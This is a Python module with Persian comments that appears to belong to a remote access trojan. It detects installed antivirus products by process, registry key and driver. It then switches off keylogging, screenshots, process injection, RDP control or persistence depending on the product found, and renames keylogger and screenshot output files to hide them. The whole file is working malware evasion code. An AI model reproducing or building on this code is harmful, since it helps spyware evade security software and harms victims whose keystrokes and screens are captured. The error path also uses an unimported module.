import psutil
import winreg
import subprocess
import logging
import platform
import os
import uuid
from typing import List, Dict
from rat_config import Config

class AntiAV:
    """ماژول برای تشخیص و مدیریت آنتی‌ویروس‌ها"""

    # لیست آنتی‌ویروس‌های شناخته‌شده و فرآیندهای مرتبط
    KNOWN_ANTIVIRUSES = {
        "Windows Defender": ["MsMpEng.exe", "smartscreen.exe"],
        "Kaspersky": ["avp.exe", "avpui.exe"],
        "ESET": ["egui.exe", "ekrn.exe"],
        "Avast": ["avastsvc.exe", "avastui.exe"],
        "Norton": ["ns.exe", "nortonsecurity.exe"],
        "McAfee": ["mfevtps.exe", "mcshield.exe"],
        "Bitdefender": ["bdagent.exe", "bdservicehost.exe"]
    }

    def __init__(self):
        if not Config.ENABLE_ANTIVIRUS_DETECTION:
            logging.info("AntiAV detection disabled in config")
            return
            
        if Config.DEBUG_MODE:
            logging.info("AntiAV initialized")

    def detect_antivirus(self) -> List[Dict]:
        """
        شناسایی آنتی‌ویروس‌های فعال با استفاده از فرآیندها، رجیستری، و درایورها
        """
        if not Config.ENABLE_ANTIVIRUS_DETECTION:
            return [{"name": "Disabled", "status": "disabled", "method": "config"}]
    
        if platform.system().lower() != "windows":
            if Config.DEBUG_MODE:
                logging.info("Antivirus detection only supported on Windows")
            return [{"name": "Unknown", "status": "not_supported"}]
    
        detected_avs = []
        processed_avs = set()  # برای جلوگیری از تشخیص تکراری
        
        try:
            # بررسی فرآیندها
            if Config.ENABLE_ANTIVIRUS_DETECTION:
                for av_name, processes in self.KNOWN_ANTIVIRUSES.items():
                    if av_name in processed_avs:
                        continue  # از پردازش تکراری جلوگیری کن
                        
                    process_found = False
                    for proc in psutil.process_iter(['name', 'pid']):
                        try:
                            if proc.info['name'].lower() in [p.lower() for p in processes]:
                                if not process_found:  # فقط یک بار برای هر آنتی‌ویروس گزارش بده
                                    detected_avs.append({
                                        "name": av_name,
                                        "process": proc.info['name'],
                                        "pid": proc.info['pid'],
                                        "status": "active",
                                        "method": "process"
                                    })
                                    processed_avs.add(av_name)
                                    process_found = True
                                    if Config.DEBUG_MODE:
                                        logging.info(f"Detected {av_name} via process: {proc.info['name']} (PID: {proc.info['pid']})")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            continue
                        
            # بررسی رجیستری
            if Config.ENABLE_ANTIVIRUS_DETECTION:
                registry_paths = {
                    "Windows Defender": r"SOFTWARE\Microsoft\Windows Defender",
                    "Kaspersky": r"SOFTWARE\KasperskyLab",
                    "ESET": r"SOFTWARE\ESET",
                    "Avast": r"SOFTWARE\AVAST Software",
                    "Norton": r"SOFTWARE\Norton",
                    "McAfee": r"SOFTWARE\McAfee",
                    "Bitdefender": r"SOFTWARE\Bitdefender",
                    "AVG": r"SOFTWARE\AVG",
                    "Malwarebytes": r"SOFTWARE\Malwarebytes",
                }
                
                for av_name, reg_path in registry_paths.items():
                    if av_name in processed_avs:
                        continue  # از پردازش تکراری جلوگیری کن
                        
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                            # اگر کلید رجیستری وجود دارد و باز می‌شود
                            detected_avs.append({
                                "name": av_name,
                                "status": "installed",
                                "method": "registry",
                                "registry_path": reg_path
                            })
                            processed_avs.add(av_name)
                            if Config.DEBUG_MODE:
                                logging.info(f"Detected {av_name} via registry: {reg_path}")
                    except FileNotFoundError:
                        # کلید رجیستری پیدا نشد - این طبیعی است
                        continue
                    except Exception as e:
                        if Config.DEBUG_MODE:
                            logging.warning(f"Registry check error for {av_name} at {reg_path}: {str(e)}")
                        continue
                    
            # بررسی درایورها
            if Config.ENABLE_ANTIVIRUS_DETECTION:
                try:
                    # روش امن‌تر برای دریافت اطلاعات درایورها
                    driver_indicators = {
                        "Kaspersky": ["klif", "kl1"],
                        "ESET": ["eamonm", "ehdrv"],
                        "Avast": ["aswsp", "aswmonflt"],
                        "Norton": ["symefasi", "srtsp"],
                        "McAfee": ["mfencbdc", "mfehidk"],
                        "Bitdefender": ["trufos", "gzflt"],
                        "AVG": ["avg", "avgtdi"],
                        "Malwarebytes": ["mbam", "mbae"],
                    }
                    
                    # اجرای دستور driverquery با مدیریت خطا
                    try:
                        result = subprocess.run(
                            ["driverquery", "/FO", "CSV", "/V"],
                            capture_output=True,
                            text=True,
                            timeout=10,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        
                        if result.returncode == 0 and result.stdout:
                            driver_output = result.stdout.lower()
                            
                            for av_name, drivers in driver_indicators.items():
                                if av_name in processed_avs:
                                    continue
                                    
                                for driver in drivers:
                                    if driver in driver_output:
                                        detected_avs.append({
                                            "name": av_name,
                                            "status": "active",
                                            "method": "driver",
                                            "driver_indicator": driver
                                        })
                                        processed_avs.add(av_name)
                                        if Config.DEBUG_MODE:
                                            logging.info(f"Detected {av_name} via driver: {driver}")
                                        break
                                        
                    except subprocess.TimeoutExpired:
                        if Config.DEBUG_MODE:
                            logging.warning("Driver query timed out")
                    except Exception as e:
                        if Config.DEBUG_MODE:
                            logging.warning(f"Driver query failed: {str(e)}")
                            
                except Exception as e:
                    if Config.DEBUG_MODE:
                        logging.error(f"Driver check error: {str(e)}")
    
            # اگر هیچ آنتی‌ویروسی پیدا نشد
            if not detected_avs:
                detected_avs.append({
                    "name": "None", 
                    "status": "no_antivirus", 
                    "method": "none",
                    "message": "No known antivirus software detected"
                })
                if Config.DEBUG_MODE:
                    logging.info("No antivirus detected")
    
            return detected_avs
    
        except Exception as e:
            error_msg = f"Antivirus detection error: {str(e)}"
            if Config.DEBUG_MODE:
                logging.error(error_msg)
            return [{
                "name": "Error", 
                "status": "error", 
                "method": "none", 
                "error": error_msg,
                "timestamp": datetime.datetime.now().isoformat()
            }]
    def adjust_behavior(self, antivirus: Dict) -> Dict:
        """
        تنظیم رفتار ابزار بر اساس آنتی‌ویروس شناسایی‌شده
        """
        if not Config.ANTIVIRUS_BEHAVIOR_ADJUSTMENT:
            return Config.get_behavior_config()

        try:
            av_name = antivirus.get("name", "Unknown")
            
            # Get current behavior from config
            behavior = Config.get_behavior_config().copy()

            if av_name == "Windows Defender":
                # Windows Defender حساس به تزریق فرآیند است
                if Config.ENABLE_PROCESS_INJECTION:
                    behavior["process_injection_enabled"] = False
                    if Config.DEBUG_MODE:
                        logging.info("Disabled process injection due to Windows Defender")
            elif av_name == "Kaspersky":
                # Kaspersky اسکرین‌شات‌ها را ممکن است بلاک کند
                if Config.ENABLE_SCREENSHOTS:
                    behavior["screenshot_enabled"] = False
                    if Config.DEBUG_MODE:
                        logging.info("Disabled screenshot capture due to Kaspersky")
            elif av_name == "ESET":
                # ESET به کیلاگینگ حساس است
                if Config.ENABLE_KEYLOGGING:
                    behavior["keylogging_enabled"] = False
                    if Config.DEBUG_MODE:
                        logging.info("Disabled keylogging due to ESET")
            elif av_name == "Avast":
                # Avast ممکن است RDP را مشکوک تشخیص دهد
                if Config.ENABLE_RDP_CONTROL:
                    behavior["rdp_enabled"] = False
                    if Config.DEBUG_MODE:
                        logging.info("Disabled RDP due to Avast")
            elif av_name in ["Norton", "McAfee", "Bitdefender"]:
                # این آنتی‌ویروس‌ها به پایداری حساس‌اند
                if Config.ENABLE_PERSISTENCE:
                    behavior["persistence_enabled"] = False
                    if Config.DEBUG_MODE:
                        logging.info(f"Disabled persistence due to {av_name}")

            return behavior

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Behavior adjustment error: {str(e)}")
            return Config.get_behavior_config()

    def obfuscate_code(self):
        """
        اعمال مبهم‌سازی ساده روی کد برای کاهش تشخیص آنتی‌ویروس
        """
        if not Config.ENABLE_CODE_OBFUSCATION:
            return False

        try:
            if Config.DEBUG_MODE:
                logging.info("Applying code obfuscation")
            
            # نمونه ساده: تغییر نام فایل‌های موقت
            temp_files = ["keylogger.log", "screenshot.png", "errors.log"]
            for file in temp_files:
                if os.path.exists(file):
                    new_name = f"temp_{uuid.uuid4().hex[:8]}.tmp"
                    os.rename(file, new_name)
                    if Config.DEBUG_MODE:
                        logging.info(f"Renamed {file} to {new_name}")
            return True
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Code obfuscation error: {str(e)}")
            return False

    def get_detection_summary(self) -> Dict:
        """خلاصه وضعیت تشخیص آنتی‌ویروس"""
        if not Config.ENABLE_ANTIVIRUS_DETECTION:
            return {"enabled": False, "message": "Antivirus detection disabled"}
        
        detected = self.detect_antivirus()
        return {
            "enabled": True,
            "detected_antiviruses": detected,
            "count": len([av for av in detected if av.get("status") in ["active", "installed"]]),
            "behavior_adjustment_enabled": Config.ANTIVIRUS_BEHAVIOR_ADJUSTMENT,
            "code_obfuscation_enabled": Config.ENABLE_CODE_OBFUSCATION
        }